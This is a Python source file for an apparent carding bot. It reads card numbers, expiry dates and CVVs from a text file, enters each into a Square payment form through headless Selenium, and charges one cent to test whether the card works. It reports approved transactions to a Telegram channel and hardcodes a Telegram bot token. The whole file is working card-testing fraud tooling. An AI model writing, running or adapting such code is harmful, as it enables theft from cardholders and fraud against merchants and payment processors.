import asyncio
import telebot
import os
import json
import logging
import aiofiles
from flask import Flask, jsonify, request, render_template, Response
from square.client import Client
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Configure logging to write to a file for displaying on the webpage
logging.basicConfig(filename='bot_activity.log', level=logging.INFO, format='%(asctime)s %(message)s')

# Load configuration from a JSON file
def load_config():
    try:
        with open('config.json') as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"Failed to load configuration: {e}")
        return {}

config = load_config()

# Setup Square Client
square_client = Client(
    access_token=config['square']['access_token'],  # Access token from Square dashboard
    environment='sandbox'  # Use sandbox for testing purposes
)

# Initialize Flask app
app = Flask(__name__)

# Hardcoded Telegram Bot Token
API_TOKEN = "7785068082:AAEwD4mFUHLVLSeA5JrXZYnj8UKt52cFpHw"
bot = telebot.TeleBot(API_TOKEN)

# Set the target Telegram channel
target_channel = os.getenv('TARGET_CHANNEL', '@cctalks700')

# Function to send confirmation to the target channel
def send_to_target_channel(transaction_info):
    try:
        bot.send_message(target_channel, f"Transaction Approved: {transaction_info}")
        logging.info(f"Sent to {target_channel}: Transaction Approved: {transaction_info}")
    except Exception as e:
        logging.error(f"Failed to send message: {e}")

# Function to process the payment using the Square API
async def process_payment(nonce):
    try:
        body = {
            "source_id": nonce,  # Nonce generated from the frontend
            "amount_money": {
                "amount": 1,  # Amount in cents ($0.01)
                "currency": "USD"
            },
            "idempotency_key": os.urandom(16).hex()  # Ensure unique transaction
        }

        result = square_client.payments.create_payment(body)

        if result.is_success:
            logging.info("Payment successful.")
            return {"status": "success", "transaction": result.body['payment']}  # Return transaction info
        else:
            logging.warning(f"Payment failed: {result.errors}")
            return {"status": "error", "errors": result.errors}

    except Exception as e:
        logging.error(f"Error processing payment: {e}")
        return {"status": "error", "error": str(e)}

# Function to scrape card details from cards.txt and generate nonce using the frontend
async def scrape_and_process_payments():
    try:
        # Set up Selenium WebDriver to automate the nonce generation
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        driver = webdriver.Chrome(options=chrome_options)

        # Load the frontend where the Square Payment Form is located
        driver.get('http://localhost:5000')

        async with aiofiles.open('cards.txt', 'r') as file:
            lines = await file.readlines()

        for line in lines:
            card_details = line.strip().split('|')  # Split card details

            # Set card details into the form using Selenium
            driver.execute_script(f'document.querySelector("#card-number").value = "{card_details[0]}";')
            driver.execute_script(f'document.querySelector("#expiration-date").value = "{card_details[1]}/{card_details[2]}";')
            driver.execute_script(f'document.querySelector("#cvv").value = "{card_details[3]}";')

            # Execute the JavaScript function to generate the nonce
            nonce = driver.execute_script('return scrapeAndGetNonce();')  # Fetch nonce from frontend

            if nonce:
                logging.info(f"Nonce generated: {nonce}")
                approved_payment = await process_payment(nonce)  # Process the payment
                if approved_payment and approved_payment['status'] == "success":
                    send_to_target_channel(approved_payment['transaction']['id'])  # Send transaction to Telegram
            else:
                logging.error(f"Failed to generate nonce for card: {card_details[0]}")

        driver.quit()

    except Exception as e:
        logging.error(f"Error in scraping and processing payments: {e}")

# Serve the bot activity logs as an HTML page
@app.route('/')
def index():
    return render_template('index.html')

# Route to stream the log file to the frontend
@app.route('/logs')
def stream_logs():
    def generate():
        with open('bot_activity.log') as f:
            while True:
                line = f.readline()
                if not line:
                    break
                yield line
    return Response(generate(), mimetype='text/plain')

# Start the scraping and processing
if __name__ == '__main__':
    logging.info("Bot is running...")
    asyncio.run(scrape_and_process_payments())  # Start payment processing loop
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # Render uses the $PORT environment variable
